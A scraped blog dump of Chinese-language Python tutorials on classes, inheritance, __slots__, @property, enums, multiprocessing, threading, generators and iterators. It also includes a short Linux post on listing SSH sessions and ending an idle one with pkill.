这样打印出来的实例，不但好看，而且容易看出实例内部重要的数据。 __repr__而__repr__()返回程序开发者看到的字符串 有个偷懒的写法： 123456class Student(object): def __init__(self, name): self.name = name def __str__(self): return &apos;Student object (name=%s)&apos; % self.name __repr__ = __str__ __iter__如果一个类想被用于for ... in循环，类似list或tuple那样，就必须实现一个__iter__()方法，该方法返回一个迭代对象，然后，Python的for循环就会不断调用该迭代对象的__next__()方法拿到循环的下一个值，直到遇到StopIteration错误时退出循环。 我们以斐波那契数列为例，写一个Fib类，可以作用于for循环： 123456789101112class Fib(object): def __init__(self): self.a, self.b = 0, 1 # 初始化两个计数器a，b def __iter__(self): return self # 实例本身就是迭代对象，故返回自己 def __next__(self): self.a, self.b = self.b, self.a + self.b # 计算下一个值 if self.a &gt; 100000: # 退出循环的条件 raise StopIteration() return self.a # 返回下一个值 现在，试试把Fib实例作用于for循环： 123456789&gt;&gt;&gt; for n in Fib():... print(n)...112...4636875025 访问限制在class内部，可以有属性和方法，而外部代码可以通过直接调用实例变量的方法来操作数据，这样就隐藏了复杂逻辑。 但外部代码还是可以自由的修改一个实例的name，和score等属性。 如果要让内部属性不被外部访问，可以把属性的名称前加上两个下划线__，在Python中，实例的变量名如果以__开头，就变成了一个私有变量（private），只有内部可以访问，外部不能访问，所以，我们把Student类改一改： 12345678class Student(object): def __init__(self, name, score): self.__name = name self.__score = score def print_score(self): print(&apos;%s: %s&apos; % (self.__name, self.__score)) 改完后，对于外部代码来说，没什么变动，但是已经无法从外部访问实例变量.__name和实例变量.__score了： 12345&gt;&gt;&gt; bart = Student(&apos;Bart Simpson&apos;, 59)&gt;&gt;&gt; bart.__nameTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &apos;Student&apos; object has no attribute &apos;__name&apos; 可以查看模块-作用域 继承 和 多态在OOP程序设计中，当我们定义一个class的时候，可以从某个现有的class继承，新的class称为子类（Subclass），而被继承的class称为基类、父类或超类（Base class、Super class）。 比如，我们已经编写了一个名为Animal的class，有一个run()方法可以直接打印： 123class Animal(object): def run(self): print(&apos;Animal is running...&apos;) 当我们需要编写Dog和Cat类时，就可以直接从Animal类继承： 12345class Dog(Animal): passclass Cat(Animal): pass 对于Dog来说，Animal就是它的父类，对于Animal来说，Dog就是它的子类。Cat和Dog类似。 继承有什么好处？最大的好处是子类获得了父类的全部功能。由于Animial实现了run()方法，因此，Dog和Cat作为它的子类，什么事也没干，就自动拥有了run()方法： 12345dog = Dog()dog.run()cat = Cat()cat.run() 运行结果如下： 12Animal is running...Animal is running... 当然，也可以对子类增加一些方法，比如Dog类： 1234567class Dog(Animal): def run(self): print(&apos;Dog is running...&apos;) def eat(self): print(&apos;Eating meat...&apos;) 继承的第二个好处需要我们对代码做一点改进。你看到了，无论是Dog还是Cat，它们run()的时候，显示的都是Animal is running...，符合逻辑的做法是分别显示Dog is running...和Cat is running...，因此，对Dog和Cat类改进如下： 123456789class Dog(Animal): def run(self): print(&apos;Dog is running...&apos;)class Cat(Animal): def run(self): print(&apos;Cat is running...&apos;) 再次运行，结果如下： 12Dog is running...Cat is running... 当子类和父类都存在相同的run()方法时，我们说，子类的run()覆盖了父类的run()，在代码运行的时候，总是会调用子类的run()。这样，我们就获得了继承的另一个好处：多态。 要理解什么是多态，我们首先要对数据类型再作一点说明。当我们定义一个class的时候，我们实际上就定义了一种数据类型。我们定义的数据类型和Python自带的数据类型，比如str、list、dict没什么两样： 123a = list() # a是list类型b = Animal() # b是Animal类型c = Dog() # c是Dog类型 判断一个变量是否是某个类型可以用isinstance()判断： 123456&gt;&gt;&gt; isinstance(a, list)True&gt;&gt;&gt; isinstance(b, Animal)True&gt;&gt;&gt; isinstance(c, Dog)True 看来a、b、c确实对应着list、Animal、Dog这3种类型。 但是等等，试试： 12&gt;&gt;&gt; isinstance(c, Animal)True 看来c不仅仅是Dog，c还是Animal！ 不过仔细想想，这是有道理的，因为Dog是从Animal继承下来的，当我们创建了一个Dog的实例c时，我们认为c的数据类型是Dog没错，但c同时也是Animal也没错，Dog本来就是Animal的一种！ 所以，在继承关系中，如果一个实例的数据类型是某个子类，那它的数据类型也可以被看做是父类。但是，反过来就不行： 123&gt;&gt;&gt; b = Animal()&gt;&gt;&gt; isinstance(b, Dog)False Dog可以看成Animal，但Animal不可以看成Dog。 要理解多态的好处，我们还需要再编写一个函数，这个函数接受一个Animal类型的变量： 123def run_twice(animal): animal.run() animal.run() 当我们传入Animal的实例时，run_twice()就打印出： 123&gt;&gt;&gt; run_twice(Animal())Animal is running...Animal is running... 当我们传入Dog的实例时，run_twice()就打印出： 123&gt;&gt;&gt; run_twice(Dog())Dog is running...Dog is running... 当我们传入Cat的实例时，run_twice()就打印出： 123&gt;&gt;&gt; run_twice(Cat())Cat is running...Cat is running... 看上去没啥意思，但是仔细想想，现在，如果我们再定义一个Tortoise类型，也从Animal派生： 123class Tortoise(Animal): def run(self): print(&apos;Tortoise is running slowly...&apos;) 当我们调用run_twice()时，传入Tortoise的实例： 123&gt;&gt;&gt; run_twice(Tortoise())Tortoise is running slowly...Tortoise is running slowly... 你会发现，新增一个Animal的子类，不必对run_twice()做任何修改，实际上，任何依赖Animal作为参数的函数或者方法都可以不加修改地正常运行，原因就在于多态。 多态的好处就是，当我们需要传入Dog、Cat、Tortoise……时，我们只需要接收Animal类型就可以了，因为Dog、Cat、Tortoise……都是Animal类型，然后，按照Animal类型进行操作即可。由于Animal类型有run()方法，因此，传入的任意类型，只要是Animal类或者子类，就会自动调用实际类型的run()方法，这就是多态的意思： 对于一个变量，我们只需要知道它是Animal类型，无需确切地知道它的子类型，就可以放心地调用run()方法，而具体调用的run()方法是作用在Animal、Dog、Cat还是Tortoise对象上，由运行时该对象的确切类型决定，这就是多态真正的威力：调用方只管调用，不管细节，而当我们新增一种Animal的子类时，只要确保run()方法编写正确，不用管原来的代码是如何调用的。这就是著名的“开闭”原则： 对扩展开放：允许新增Animal子类； 对修改封闭：不需要修改依赖Animal类型的run_twice()等函数。 继承还可以一级一级地继承下来，就好比从爷爷到爸爸、再到儿子这样的关系。而任何类，最终都可以追溯到根类object，这些继承关系看上去就像一颗倒着的树。比如如下的继承树： 1234567891011121314151617 ┌───────────────┐ │ object │ └───────────────┘ │ ┌────────────┴────────────┐ │ │ ▼ ▼ ┌─────────────┐ ┌─────────────┐ │ Animal │ │ Plant │ └─────────────┘ └─────────────┘ │ │ ┌─────┴──────┐ ┌─────┴──────┐ │ │ │ │ ▼ ▼ ▼ ▼┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐│ Dog │ │ Cat │ │ Tree │ │ Flower │└─────────┘ └─────────┘ └─────────┘ └─────────┘ 面向对象高级编程__slots__正常情况下，当我们定义了一个class，创建了一个class的实例后，我们可以给该实例绑定任何属性和方法，这就是动态语言的灵活性。先定义class： 12class Student(object): pass 然后，尝试给实例绑定一个属性： 1234&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.name = &apos;Michael&apos; # 动态给实例绑定一个属性&gt;&gt;&gt; print(s.name)Michael 还可以尝试给实例绑定一个方法： 12345678&gt;&gt;&gt; def set_age(self, age): # 定义一个函数作为实例方法... self.age = age...&gt;&gt;&gt; from types import MethodType&gt;&gt;&gt; s.set_age = MethodType(set_age, s) # 给实例绑定一个方法&gt;&gt;&gt; s.set_age(25) # 调用实例方法&gt;&gt;&gt; s.age # 测试结果25 但是，给一个实例绑定的方法，对另一个实例是不起作用的： 12345&gt;&gt;&gt; s2 = Student() # 创建新的实例&gt;&gt;&gt; s2.set_age(25) # 尝试调用方法Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &apos;Student&apos; object has no attribute &apos;set_age&apos; 为了给所有实例都绑定方法，可以给class绑定方法： 1234&gt;&gt;&gt; def set_score(self, score):... self.score = score...&gt;&gt;&gt; Student.set_score = set_score 给class绑定方法后，所有实例均可调用： 123456&gt;&gt;&gt; s.set_score(100)&gt;&gt;&gt; s.score100&gt;&gt;&gt; s2.set_score(99)&gt;&gt;&gt; s2.score99 通常情况下，上面的set_score方法可以直接定义在class中，但动态绑定允许我们在程序运行的过程中动态给class加上功能，这在静态语言中很难实现。 但是，如果我们想要限制实例的属性怎么办？比如，只允许对Student实例添加name和age属性。 为了达到限制的目的，Python允许在定义class的时候，定义一个特殊的__slots__变量，来限制该class实例能添加的属性： 12class Student(object): __slots__ = (&apos;name&apos;, &apos;age&apos;) # 用tuple定义允许绑定的属性名称 然后，我们试试： 1234567&gt;&gt;&gt; s = Student() # 创建新的实例&gt;&gt;&gt; s.name = &apos;Michael&apos; # 绑定属性&apos;name&apos;&gt;&gt;&gt; s.age = 25 # 绑定属性&apos;age&apos;&gt;&gt;&gt; s.score = 99 # 绑定属性&apos;score&apos;Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &apos;Student&apos; object has no attribute &apos;score&apos; 由于&#39;score&#39;没有被放到__slots__中，所以不能绑定score属性，试图绑定score将得到AttributeError的错误。 使用__slots__要注意，__slots__定义的属性仅对当前类实例起作用，对继承的子类是不起作用的： 12345&gt;&gt;&gt; class GraduateStudent(Student):... pass...&gt;&gt;&gt; g = GraduateStudent()&gt;&gt;&gt; g.score = 9999 除非在子类中也定义__slots__，这样，子类实例允许定义的属性就是自身的__slots__加上父类的__slots__。 @propertyPython内置的@property装饰器就是负责把一个方法变成属性调用的： 12345678910111213class Student(object): @property def score(self): return self._score @score.setter def score(self, value): if not isinstance(value, int): raise ValueError(&apos;score must be an integer!&apos;) if value &lt; 0 or value &gt; 100: raise ValueError(&apos;score must between 0 ~ 100!&apos;) self._score = value @property的实现比较复杂，我们先考察如何使用。把一个getter方法变成属性，只需要加上@property就可以了，此时，@property本身又创建了另一个装饰器@score.setter，负责把一个setter方法变成属性赋值，于是，我们就拥有一个可控的属性操作： 12345678&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.score = 60 # OK，实际转化为s.set_score(60)&gt;&gt;&gt; s.score # OK，实际转化为s.get_score()60&gt;&gt;&gt; s.score = 9999Traceback (most recent call last): ...ValueError: score must between 0 ~ 100! 注意到这个神奇的@property，我们在对实例属性操作的时候，就知道该属性很可能不是直接暴露的，而是通过getter和setter方法来实现的。 还可以定义只读属性，只定义getter方法，不定义setter方法就是一个只读属性： 12345678910111213class Student(object): @property def birth(self): return self._birth @birth.setter def birth(self, value): self._birth = value @property def age(self): return 2015 - self._birth 上面的birth是可读写属性，而age就是一个只读属性，因为age可以根据birth和当前时间计算出来。 枚举类Python提供了Enum类来实现这个功能： 123from enum import EnumMonth = Enum(&apos;Month&apos;, (&apos;Jan&apos;, &apos;Feb&apos;, &apos;Mar&apos;, &apos;Apr&apos;, &apos;May&apos;, &apos;Jun&apos;, &apos;Jul&apos;, &apos;Aug&apos;, &apos;Sep&apos;, &apos;Oct&apos;, &apos;Nov&apos;, &apos;Dec&apos;)) 这样我们就获得了Month类型的枚举类，可以直接使用Month.Jan来引用一个常量，或者枚举它的所有成员： 12for name, member in Month.__members__.items(): print(name, &apos;=&gt;&apos;, member, &apos;,&apos;, member.value) value属性则是自动赋给成员的int常量，默认从1开始计数。 如果需要更精确地控制枚举类型，可以从Enum派生出自定义类： 1234567891011from enum import Enum, unique@uniqueclass Weekday(Enum): Sun = 0 # Sun的value被设定为0 Mon = 1 Tue = 2 Wed = 3 Thu = 4 Fri = 5 Sat = 6 @unique装饰器可以帮助我们检查保证没有重复值。 进程 线程多任务实现模式: 一种是启动多个进程，每个进程虽然只有一个线程，但多个进程可以一块执行多个任务。 一种方法是启动一个进程，在一个进程内启动多个线程，这样，多个线程也可以一块执行多个任务。 第三种方法，就是启动多个进程，每个进程再启动多个线程，这样同时执行的任务就更多了，当然这种模型更复杂，实际很少采用。 总结一下就是，多任务的实现有3种方式： 多进程模式； 多线程模式； 多进程+多线程模式。 多进程Unix/Linux操作系统提供了一个fork()系统调用，它非常特殊。普通的函数调用，调用一次，返回一次，但是fork()调用一次，返回两次，因为操作系统自动把当前进程（称为父进程）复制了一份（称为子进程），然后，分别在父进程和子进程内返回。 子进程永远返回0，而父进程返回子进程的ID。这样做的理由是，一个父进程可以fork出很多子进程，所以，父进程要记下每个子进程的ID，而子进程只需要调用getppid()就可以拿到父进程的ID。 Python的os模块封装了常见的系统调用，其中就包括fork，可以在Python程序中轻松创建子进程： 123456789import osprint(&apos;Process (%s) start...&apos; % os.getpid())# Only works on Unix/Linux/Mac:pid = os.fork()if pid == 0: print(&apos;I am child process (%s) and my parent is %s.&apos; % (os.getpid(), os.getppid()))else: print(&apos;I (%s) just created a child process (%s).&apos; % (os.getpid(), pid)) 运行结果如下： 123Process (876) start...I (876) just created a child process (877).I am child process (877) and my parent is 876. Window multiprocessingultiprocessing模块就是跨平台版本的多进程模块。 multiprocessing模块提供了一个Process类来代表一个进程对象，下面的例子演示了启动一个子进程并等待其结束： 1234567891011121314from multiprocessing import Processimport os# 子进程要执行的代码def run_proc(name): print(&apos;Run child process %s (%s)...&apos; % (name, os.getpid()))if __name__==&apos;__main__&apos;: print(&apos;Parent process %s.&apos; % os.getpid()) p = Process(target=run_proc, args=(&apos;test&apos;,)) print(&apos;Child process will start.&apos;) p.start() p.join() print(&apos;Child process end.&apos;) 执行结果如下： 1234Parent process 928.Process will start.Run child process test (929)...Process end. 创建子进程时，只需要传入一个执行函数和函数的参数，创建一个Process实例，用start()方法启动，这样创建进程比fork()还要简单。 join()方法可以等待子进程结束后再继续往下运行，通常用于进程间的同步。 Pool启动大量的子进程, 可以用进程池方式批量创建子进程: 12345678910111213141516171819from multiprocessing import Poolimport os, time, randomdef long_time_task(name): print(&apos;Run task %s (%s)...&apos; % (name, os.getpid())) start = time.time() time.sleep(random.random() * 3) end = time.time() print(&apos;Task %s runs %0.2f seconds.&apos; % (name, (end - start)))if __name__==&apos;__main__&apos;: print(&apos;Parent process %s.&apos; % os.getpid()) p = Pool(4) for i in range(5): p.apply_async(long_time_task, args=(i,)) print(&apos;Waiting for all subprocesses done...&apos;) p.close() p.join() print(&apos;All subprocesses done.&apos;) 执行结果如下： 12345678910111213Parent process 669.Waiting for all subprocesses done...Run task 0 (671)...Run task 1 (672)...Run task 2 (673)...Run task 3 (674)...Task 2 runs 0.14 seconds.Run task 4 (673)...Task 1 runs 0.27 seconds.Task 3 runs 0.86 seconds.Task 0 runs 1.41 seconds.Task 4 runs 1.91 seconds.All subprocesses done. 代码解读： 对Pool对象调用join()方法会等待所有子进程执行完毕，调用join()之前必须先调用close()，调用close()之后就不能继续添加新的Process了。 请注意输出的结果，task 0，1，2，3是立刻执行的，而task 4要等待前面某个task完成后才执行，这是因为Pool的默认大小在我的电脑上是4，因此，最多同时执行4个进程。这是Pool有意设计的限制，并不是操作系统的限制。如果改成： 1p = Pool(5) 就可以同时跑5个进程。 由于Pool的默认大小是CPU的核数，如果你不幸拥有8核CPU，你要提交至少9个子进程才能看到上面的等待效果。 子进程 subprocess启动一个子进程， 控制其输入和输出。 12345import subprocessprint(&apos;$ nslookup www.python.org&apos;)r = subprocess.call([&apos;nslookup&apos;, &apos;www.python.org&apos;])print(&apos;Exit code:&apos;, r) 运行结果： 12345678910$ nslookup www.python.orgServer: 192.168.19.4Address: 192.168.19.4#53Non-authoritative answer:www.python.org canonical name = python.map.fastly.net.Name: python.map.fastly.netAddress: 199.27.79.223Exit code: 0 进程间通讯 Queue/Pipes12345678910111213141516171819202122232425262728293031from multiprocessing import Process, Queueimport os, time, random# 写数据进程执行的代码:def write(q): print(&apos;Process to write: %s&apos; % os.getpid()) for value in [&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]: print(&apos;Put %s to queue...&apos; % value) q.put(value) time.sleep(random.random())# 读数据进程执行的代码:def read(q): print(&apos;Process to read: %s&apos; % os.getpid()) while True: value = q.get(True) print(&apos;Get %s from queue.&apos; % value)if __name__==&apos;__main__&apos;: # 父进程创建Queue，并传给各个子进程： q = Queue() pw = Process(target=write, args=(q,)) pr = Process(target=read, args=(q,)) # 启动子进程pw，写入: pw.start() # 启动子进程pr，读取: pr.start() # 等待pw结束: pw.join() # pr进程里是死循环，无法等待其结束，只能强行终止: pr.terminate() 运行结果如下： 12345678Process to write: 50563Put A to queue...Process to read: 50564Get A from queue.Put B to queue...Get B from queue.Put C to queue...Get C from queue. 在Unix/Linux下，multiprocessing模块封装了fork()调用，使我们不需要关注fork()的细节。由于Windows没有fork调用，因此，multiprocessing需要“模拟”出fork的效果，父进程所有Python对象都必须通过pickle序列化再传到子进程去，所有，如果multiprocessing在Windows下调用失败了，要先考虑是不是pickle失败了。 多线程 ThreadingPython的标准库提供了两个模块：_thread和threading，_thread是低级模块，threading是高级模块，对_thread进行了封装。绝大多数情况下，我们只需要使用threading这个高级模块。 启动一个线程就是把一个函数传入并创建Thread实例，然后调用start()开始执行： 1234567891011121314151617import time, threading# 新线程执行的代码:def loop(): print(&apos;thread %s is running...&apos; % threading.current_thread().name) n = 0 while n &lt; 5: n = n + 1 print(&apos;thread %s &gt;&gt;&gt; %s&apos; % (threading.current_thread().name, n)) time.sleep(1) print(&apos;thread %s ended.&apos; % threading.current_thread().name)print(&apos;thread %s is running...&apos; % threading.current_thread().name)t = threading.Thread(target=loop, name=&apos;LoopThread&apos;)t.start()t.join()print(&apos;thread %s ended.&apos; % threading.current_thread().name) 执行结果如下： 123456789thread MainThread is running...thread LoopThread is running...thread LoopThread &gt;&gt;&gt; 1thread LoopThread &gt;&gt;&gt; 2thread LoopThread &gt;&gt;&gt; 3thread LoopThread &gt;&gt;&gt; 4thread LoopThread &gt;&gt;&gt; 5thread LoopThread ended.thread MainThread ended. 由于任何进程默认就会启动一个线程，我们把该线程称为主线程，主线程又可以启动新的线程，Python的threading模块有个current_thread()函数，它永远返回当前线程的实例。 lock多线程 和 多进程最大的不同在于， 多进程中，同一个变量，各自有一份拷贝存在于每个进程中，互不影响。 内置函数isinstance() 数据类型检查 数据类型检查可以用内置函数isinstance()实现 1234567def my_abs(x): if not isinstance(x, (int, float)): raise TypeError(&apos;bad operand type&apos;) if x &gt;= 0: return x else: return -x 可以使用isinstance()判断一个对象是否是Iterable对象： 123&gt;&gt;&gt; from collections import Iterable&gt;&gt;&gt; isinstance([], Iterable)True ​ Type 判断对象类型1234&gt;&gt;&gt; type(abs)&lt;class &apos;builtin_function_or_method&apos;&gt;&gt;&gt;&gt; type(a)&lt;class &apos;__main__.Animal&apos;&gt; 但是type()函数返回的是什么类型呢？它返回对应的Class类型。如果我们要在if语句中判断，就需要比较两个变量的type类型是否相同： 12345678&gt;&gt;&gt; type(123)==type(456)True&gt;&gt;&gt; type(123)==intTrue&gt;&gt;&gt; type(&apos;abc&apos;)==type(&apos;123&apos;)True&gt;&gt;&gt; type(&apos;abc&apos;)==strTrue 判断基本数据类型可以直接写int，str等，但如果要判断一个对象是否是函数怎么办？可以使用types模块中定义的常量： 123456789101112&gt;&gt;&gt; import types&gt;&gt;&gt; def fn():... pass...&gt;&gt;&gt; type(fn)==types.FunctionTypeTrue&gt;&gt;&gt; type(abs)==types.BuiltinFunctionTypeTrue&gt;&gt;&gt; type(lambda x: x)==types.LambdaTypeTrue&gt;&gt;&gt; type((x for x in range(10)))==types.GeneratorTypeTrue Dir 对象属性和方法如果要获得一个对象的所有属性和方法，可以使用dir()函数，它返回一个包含字符串的list，比如，获得一个str对象的所有属性和方法： 12&gt;&gt;&gt; dir(&apos;ABC&apos;)[&apos;__add__&apos;, &apos;__class__&apos;,..., &apos;__subclasshook__&apos;, &apos;capitalize&apos;, &apos;casefold&apos;,..., &apos;zfill&apos;] 类似__xxx__的属性和方法在Python中都是有特殊用途的，比如__len__方法返回长度。在Python中，如果你调用len()函数试图获取一个对象的长度，实际上，在len()函数内部，它自动去调用该对象的__len__()方法，所以，下面的代码是等价的： 1234&gt;&gt;&gt; len(&apos;ABC&apos;)3&gt;&gt;&gt; &apos;ABC&apos;.__len__()3 自己写的类，如果也想用len(myObj)的话，就自己写一个__len__()方法： 1234567&gt;&gt;&gt; class MyDog(object):... def __len__(self):... return 100...&gt;&gt;&gt; dog = MyDog()&gt;&gt;&gt; len(dog)100","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Python/"}]},{"title":"强制踢出其他正在SSH登陆的用户","slug":"commands/Linux-强制踢出其他正在SSH登陆的用户","date":"2018-01-12T13:06:34.000Z","updated":"2018-12-05T11:01:49.177Z","comments":true,"path":"2018/01/12/commands/Linux-强制踢出其他正在SSH登陆的用户/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/12/commands/Linux-强制踢出其他正在SSH登陆的用户/","excerpt":"​ 在一些生产平台或者做安全审计的时候往往看到一大堆的用户SSH连接到同一台服务器，或者连接后没有正常关闭进程还驻留在系统内。限制SSH连接数与手动断开空闲连接也有必要之举，这里写出手动剔出其他用户的过程。","text":"​ 在一些生产平台或者做安全审计的时候往往看到一大堆的用户SSH连接到同一台服务器，或者连接后没有正常关闭进程还驻留在系统内。限制SSH连接数与手动断开空闲连接也有必要之举，这里写出手动剔出其他用户的过程。 查看正在系统登录的用户 w 123456[root@localhost ~]# w 01:53:11 up 42 days, 5:51, 3 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot pts/0 58.56.174.106 01:07 45:49 0.00s 0.00s tailf /var/log/nginx/error.logroot pts/1 124.133.18.218 01:51 0.00s 0.01s 0.00s wroot pts/2 58.56.174.106 00:56 26:14 0.05s 0.05s -bash 查看自己登录的tty (who am i) 12[root@localhost ~]# who am i root pts/1 Nov 12 01:51 (124.133.18.218) 注意查看Ip，自己可能使用多个tty,小心踢出重要会话 踢出对方 pkill 1pkill -kill -t pts/0 查看系统登录信息 123456[root@localhost ~]# pkill -kill -t pts/0 [root@localhost ~]# w 01:53:30 up 42 days, 5:51, 2 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot pts/1 124.133.18.218 01:51 0.00s 0.01s 0.00s wroot pts/2 58.56.174.106 00:56 26:33 0.05s 0.05s -bash","categories":[{"name":"命令","slug":"命令","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"Python-高级函数","slug":"gram/Python-高级函数","date":"2018-01-12T12:42:59.000Z","updated":"2018-11-19T16:13:04.894Z","comments":true,"path":"2018/01/12/gram/Python-高级函数/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/12/gram/Python-高级函数/","excerpt":"切片 迭代 列表生成器 生成器 高阶函数 map reduce fliter sorted lambda 装饰器","text":"切片 迭代 列表生成器 生成器 高阶函数 map reduce fliter sorted lambda 装饰器 切片12&gt;&gt;&gt; L[0:3][&apos;Michael&apos;, &apos;Sarah&apos;, &apos;Tracy&apos;] L[0:3]表示，从索引0开始取，直到索引3为止，但不包括索引3。即索引0，1，2，正好是3个元素。 记住倒数第一个元素的索引是-1。 切片操作十分有用。我们先创建一个0-99的数列： 123&gt;&gt;&gt; L = list(range(100))&gt;&gt;&gt; L[0, 1, 2, 3, ..., 99] 可以通过切片轻松取出某一段数列。比如前10个数： 12&gt;&gt;&gt; L[:10][0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 后10个数： 12&gt;&gt;&gt; L[-10:][90, 91, 92, 93, 94, 95, 96, 97, 98, 99] 迭代如果给定一个list或tuple，我们可以通过for循环来遍历这个list或tuple，这种遍历我们称为迭代（Iteration）。 在Python中，迭代是通过for ... in来完成的，而很多语言比如C语言，迭代list是通过下标完成的，比如Java代码： 123for (i=0; i&lt;list.length; i++) &#123; n = list[i];&#125; 可以看出，Python的for循环抽象程度要高于C的for循环，因为Python的for循环不仅可以用在list或tuple上，还可以作用在其他可迭代对象上。 list这种数据类型虽然有下标，但很多其他数据类型是没有下标的，但是，只要是可迭代对象，无论有无下标，都可以迭代，比如dict就可以迭代： 1234567&gt;&gt;&gt; d = &#123;&apos;a&apos;: 1, &apos;b&apos;: 2, &apos;c&apos;: 3&#125;&gt;&gt;&gt; for key in d:... print(key)...acb 因为dict的存储不是按照list的方式顺序排列，所以，迭代出的结果顺序很可能不一样。 默认情况下，dict迭代的是key。如果要迭代value，可以用for value in d.values()，如果要同时迭代key和value，可以用for k, v in d.items()。 列表生成式 []12&gt;&gt;&gt; [x * x for x in range(1, 11)][1, 4, 9, 16, 25, 36, 49, 64, 81, 100] 还可以使用两层循环，可以生成全排列： 12&gt;&gt;&gt; [m + n for m in &apos;ABC&apos; for n in &apos;XYZ&apos;][&apos;AX&apos;, &apos;AY&apos;, &apos;AZ&apos;, &apos;BX&apos;, &apos;BY&apos;, &apos;BZ&apos;, &apos;CX&apos;, &apos;CY&apos;, &apos;CZ&apos;] 生成器 ()创建一个包含100万个元素的列表，不仅占用很大的存储空间，如果我们仅仅需要访问前面几个元素，那后面绝大多数元素占用的空间都白白浪费了。 所以，如果列表元素可以按照某种算法推算出来，那我们是否可以在循环的过程中不断推算出后续的元素呢？这样就不必创建完整的list，从而节省大量的空间。 在Python中，这种一边循环一边计算的机制，称为生成器：generator。 generator 相当于 元组 123456&gt;&gt;&gt; L = [x * x for x in range(10)]&gt;&gt;&gt; L[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]&gt;&gt;&gt; g = (x * x for x in range(10))&gt;&gt;&gt; g&lt;generator object &lt;genexpr&gt; at 0x1022ef630&gt; 创建L和g的区别仅在于最外层的[]和()，L是一个list，而g是一个generator。 可以通过next()函数获得generator的下一个返回值： 1234567891011&gt;&gt;&gt; next(g)0&gt;&gt;&gt; next(g)1&gt;&gt;&gt; next(g)4&gt;&gt;&gt; next(g)9&gt;&gt;&gt; next(g)16&gt;&gt;&gt; next(g) generator保存的是算法，每次调用next(g)，就计算出g的下一个元素的值，直到计算到最后一个元素，没有更多的元素时，抛出StopIteration的错误。 1234&gt;&gt;&gt; g = (x * x for x in range(10)) // generator 存储计算&gt;&gt;&gt; for n in g:... print(n)... 我们创建了一个generator后，基本上永远不会调用next()，而是通过for循环来迭代它，并且不需要关心StopIteration的错误。 迭代器一类是集合数据类型，如list、tuple、dict、set、str等； 一类是generator，包括生成器和带yield的generator function。 这些可以直接作用于for循环的对象统称为可迭代对象：Iterable。 –&gt; 可迭代 可以使用isinstance()判断一个对象是否是Iterable对象： 1234567891011&gt;&gt;&gt; from collections import Iterable&gt;&gt;&gt; isinstance([], Iterable)True&gt;&gt;&gt; isinstance(&#123;&#125;, Iterable)True&gt;&gt;&gt; isinstance(&apos;abc&apos;, Iterable)True&gt;&gt;&gt; isinstance((x for x in range(10)), Iterable)True&gt;&gt;&gt; isinstance(100, Iterable)False 可以被next()函数调用并不断返回下一个值的对象称为迭代器：Iterator。 –&gt; 迭代器 可以使用isinstance()判断一个对象是否是Iterator对象： 123456789&gt;&gt;&gt; from collections import Iterator&gt;&gt;&gt; isinstance((x for x in range(10)), Iterator)True&gt;&gt;&gt; isinstance([], Iterator)False&gt;&gt;&gt; isinstance(&#123;&#125;, Iterator)False&gt;&gt;&gt; isinstance(&apos;abc&apos;, Iterator)False 生成器都是Iterator对象，但list、dict、str虽然是Iterable，却不是Iterator。 这是因为Python的Iterator对象表示的是一个数据流，Iterator对象可以被next()函数调用并不断返回下一个数据，直到没有数据时抛出StopIteration错误。可以把这个数据流看做是一个有序序列，但我们却不能提前知道序列的长度，只能不断通过next()函数实现按需计算下一个数据，所以Iterator的计算是惰性的，只有在需要返回下一个数据时它才会计算。 Iterator甚至可以表示一个无限大的数据流，例如全体自然数。而使用list是永远不可能存储全体自然数的。 重点 凡是可作用于for循环的对象都是Iterable类型； 凡是可作用于next()函数的对象都是Iterator类型，它们表示一个惰性计算的序列； 集合数据类型如list、dict、str等是Iterable但不是Iterator，不过可以通过iter()函数获得一个Iterator对象。 Python的for循环本质上就是通过不断调用next()函数实现的，例如： 12for x in [1, 2, 3, 4, 5]: pass 实际上完全等价于： 12345678910# 首先获得Iterator对象:it = iter([1, 2, 3, 4, 5]) // --&gt; iterator 迭代器# 循环:while True: try: # 获得下一个值: x = next(it) except StopIteration: # 遇到StopIteration就退出循环 break 高阶函数map iteratormap()函数接收两个参数，一个是函数，一个是Iterable，map将传入的函数依次作用到序列的每个元素，并把结果作为新的Iterator返回。 举例说明，比如我们有一个函数f(x)=x2，要把这个函数作用在一个list [1, 2, 3, 4, 5, 6, 7, 8, 9]上，就可以用map()实现如下： 123456789101112131415 f(x) = x * x │ │ ┌───┬───┬───┬───┼───┬───┬───┬───┐ │ │ │ │ │ │ │ │ │ ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼[ 1 2 3 4 5 6 7 8 9 ] │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼[ 1 4 9 16 25 36 49 64 81 ] 现在，我们用Python代码实现： 123456&gt;&gt;&gt; def f(x):... return x * x...&gt;&gt;&gt; r = map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])&gt;&gt;&gt; list(r)[1, 4, 9, 16, 25, 36, 49, 64, 81] --&gt; 形成list map()传入的第一个参数是f，即函数对象本身。由于结果r是一个Iterator，Iterator是惰性序列，因此通过list()函数让它把整个序列都计算出来并返回一个list。 12345678&gt;&gt;&gt; next(r)1&gt;&gt;&gt; next(r)4&gt;&gt;&gt; 